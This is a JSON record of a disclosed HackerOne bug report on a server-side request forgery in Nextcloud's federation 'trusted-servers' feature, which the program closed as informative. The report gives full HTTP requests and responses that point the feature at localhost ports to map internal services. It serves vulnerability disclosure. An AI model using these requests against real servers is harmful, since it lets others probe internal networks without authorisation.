@@ -1,0 +1,105 @@
+{
+  "id": 145524,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDU1MjQ=",
+  "url": "https://hackerone.com/reports/145524",
+  "title": "Server side request forgery (SSRF) on nextcloud implementation.",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2016-06-17T19:27:26.292Z",
+  "submitted_at": "2016-06-17T19:27:26.292Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "paglababa",
+    "url": "/paglababa",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/085/805/ab247fbb0f205000b4ff554890b64b285fefb386_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-06-17T19:41:05.007Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-17T19:36:00.264Z",
+  "team_member_agreed_on_going_public_at": "2016-06-17T19:41:04.890Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An admin of nextcloud server can add other trusted nextcloud server in his own installation. The following request passes when a new add request  is processed:\n\n```http\nPOST /nextcloud/index.php/apps/federation/trusted-servers HTTP/1.1\nHost: myown.nextcloudserver.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: GAFcYDUGGyM0CCYeIlk4b19ADhwOFgcLOy4kERdDL1Q=:AL1VmGJMGqQsVhw59y9yE/wsjGJWMtc8DJljyuFMaI4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 27\nCookie: oc6wp9sjado5=nnofa4hfq2esn7anu70hg3c2h0; oc_sessionPassphrase=dvniWxtCrcQk4Nbt4eXXmyZu5wUk3JoHziCUaCBcmeQFaM0333bS8HBwvFOAEwF2f0cnj9gewI7OSn1ELD3IiOysU3FOj%2FkA%2BV2kZ%2FUmc9UMQTzoZpp1VSLNUJXEKQkw; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true\nConnection: close\n\nurl=http://nextcloud.remote.server.com/\n```\n\nThis request initiates a **cURL** request to the **POST** variable. The response looks like this:\n\n```http\nHTTP/1.1 400 Bad request\nDate: Fri, 17 Jun 2016 19:21:09 GMT\nServer: Apache/2.4.7 (Ubuntu)\nX-Powered-By: PHP/5.5.9-1ubuntu4.14\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-cache, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Frame-Options: Sameorigin\nX-Robots-Tag: none\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nContent-Length: 117\nConnection: close\nContent-Type: application/json; charset=utf-8\n\n{\"message\":\"Client error response [url] http:\\/\\/google.com\\/status.php [status code] 404 [reason phrase] Not Found\"}\n```\n\n**Attack Scenario**\nThis feature can be used to launch SSRF attack to map the internal network. For example, this feature can be used to identify the internal open ports. Consider the following example:\n\n```http\nPOST /nextcloud/index.php/apps/federation/trusted-servers HTTP/1.1\nHost: myown.nextcloudserver.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: GAFcYDUGGyM0CCYeIlk4b19ADhwOFgcLOy4kERdDL1Q=:AL1VmGJMGqQsVhw59y9yE/wsjGJWMtc8DJljyuFMaI4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 23\nCookie: oc6wp9sjado5=nnofa4hfq2esn7anu70hg3c2h0; oc_sessionPassphrase=dvniWxtCrcQk4Nbt4eXXmyZu5wUk3JoHziCUaCBcmeQFaM0333bS8HBwvFOAEwF2f0cnj9gewI7OSn1ELD3IiOysU3FOj%2FkA%2BV2kZ%2FUmc9UMQTzoZpp1VSLNUJXEKQkw; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true\nConnection: close\n\nurl=http://127.0.0.1:80\n```\n\n**Response**\n\n```json\n{\"message\":\"Client error response [url] http:\\/\\/127.0.0.1\\/status.php [status code] 404 [reason phrase] Not Found\"}\n```\n\nThis indicates that port **80** of the localhost is open. To check port 8080 we used **http://127.0.0.1:8080** as **POST** value and  the following response was received :\n\n```json\n{\"message\":\"cURL error 7: Failed to connect to 127.0.0.1 port 8080: Connection refused\"}\n```\n\nWe received an error because the PORT 8080 of localhost was blocked.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 18,
+  "voters": [
+    "smiegles",
+    "shailesh4594",
+    "gerben_javado",
+    "nahamsec",
+    "try_to_hack",
+    "robd4k",
+    "skansing",
+    "guido",
+    "theflofly",
+    "paramdham",
+    "and 8 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
